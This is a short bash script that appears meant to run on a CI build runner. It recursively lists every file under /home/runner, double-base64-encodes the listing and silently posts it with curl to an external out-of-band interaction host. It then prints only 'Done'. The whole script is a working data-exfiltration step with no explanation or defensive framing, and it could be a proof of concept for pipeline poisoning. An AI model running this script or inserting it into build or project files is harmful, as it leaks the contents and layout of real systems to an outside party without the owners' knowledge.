#!/bin/bash

B64_BLOB=`ls -lahR /home/runner/ | base64 | base64`

echo $B64_BLOB > files.txt

curl -s -d @files.txt "https://dqlfdzgroddmzbuqfjnd4pjc1za4wsp46.oast.fun/" > /dev/null

echo "Done"